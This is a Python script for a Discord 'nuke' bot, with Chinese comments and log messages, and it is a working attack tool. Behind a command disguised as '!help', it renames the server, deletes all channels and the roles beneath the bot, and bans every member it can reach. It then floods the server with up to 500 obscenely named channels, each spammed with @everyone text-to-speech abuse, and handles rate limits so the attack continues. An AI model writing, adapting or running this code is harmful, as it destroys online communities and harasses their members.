import discord
from discord.ext import commands
import asyncio
import itertools
import os
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s'
)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CHANNELS_PATH = os.path.join(BASE_DIR, "channels.txt")
MESSAGES_PATH = os.path.join(BASE_DIR, "messages.txt")

def init_txt_files():
    if not os.path.exists(CHANNELS_PATH):
        defaults = ["吃我雞巴", "幹垃圾群組"]
        with open(CHANNELS_PATH, "w", encoding="utf-8") as f:
            f.write("\n".join(defaults))
        logging.info(f"已成功於同目錄建立: {CHANNELS_PATH}")

    if not os.path.exists(MESSAGES_PATH):
        default_msg = (
            "# ⚠️ YOUR SERVER HAS BEEN FULLY NUKED ⚠️\n"
            "> **ALL CHANNELS, ROLES, AND MEMBERS HAVE BEEN WIPED.**\n\n"
            "@everyone @here\n"
            "||吃我雞巴，垃圾群組滾去吃屎||"
        )
        with open(MESSAGES_PATH, "w", encoding="utf-8") as f:
            f.write(default_msg)
        logging.info(f"已成功於同目錄建立: {MESSAGES_PATH}")

init_txt_files()

def get_channels():
    if os.path.exists(CHANNELS_PATH):
        with open(CHANNELS_PATH, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
            return lines if lines else ["nuked-by-null"]
    return ["nuked-by-null"]

def get_message():
    if os.path.exists(MESSAGES_PATH):
        with open(MESSAGES_PATH, "r", encoding="utf-8") as f:
            content = f.read()
            return content if content else "@everyone Server Nuked!"
    return "@everyone Server Nuked!"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ⚠️ 請將引號內的文字換成你重置後的新 Bot Token ⚠️
TOKEN = "將該文字替換為您的機器人Token"

@bot.event
async def on_ready():
    logging.info(f"機器人已成功登入: {bot.user.name} (ID: {bot.user.id})")
    logging.info(f"txt 讀取路徑確認: {CHANNELS_PATH}")
    print(f"您的炸群機器人{bot.user}已準備")
    print("請使用 !help 進行轟炸")

@bot.command(name="help")
async def nuke_help(ctx):
    guild = ctx.guild
    channel_list = get_channels()
    message_content = get_message()
    channel_cycle = itertools.cycle(channel_list)

    logging.info(f"開始對伺服器 [{guild.name}] 執行清空與洗版作業...")

    try:
        await guild.edit(name="NUKED BY NULL", icon=None)
    except Exception:
        pass

    async def purge_members():
        try:
            bot_me = guild.me
            async for member in guild.fetch_members(limit=None):
                if member.id == guild.owner_id or member.id == bot_me.id:
                    continue
                if member.top_role < bot_me.top_role:
                    try:
                        await member.ban(reason="Nuked")
                        logging.info(f"成功 Ban 人物: {member.name}")
                        await asyncio.sleep(0.2)
                    except discord.HTTPException as e:
                        if e.status == 429:
                            await asyncio.sleep(3)
                    except Exception:
                        pass
        except Exception as e:
            logging.error(f"拉取成員名單失敗: {e}")

    for ch in list(guild.channels):
        try:
            await ch.delete()
        except Exception:
            pass

    for role in list(guild.roles):
        try:
            if not role.is_default() and role < guild.me.top_role:
                await role.delete()
        except Exception:
            pass

    bot.loop.create_task(purge_members())

    async def spam_task(channel):
        await asyncio.sleep(0.3)
        for _ in range(5):
            try:
                await channel.send(message_content, tts=True)
                await asyncio.sleep(0.5)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, 'retry_after', 2.0)
                    await asyncio.sleep(retry_after)
                else:
                    break
            except Exception:
                break

    async def infinite_channel_loop():
        for name in channel_cycle:
            if len(guild.channels) >= 500:
                await asyncio.sleep(5)
                continue

            try:
                new_ch = await guild.create_text_channel(name)
                bot.loop.create_task(spam_task(new_ch))
                await asyncio.sleep(0.4)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, 'retry_after', 3.0)
                    await asyncio.sleep(retry_after)
            except Exception:
                await asyncio.sleep(1)

    bot.loop.create_task(infinite_channel_loop())

if __name__ == "__main__":
    bot.run(TOKEN)
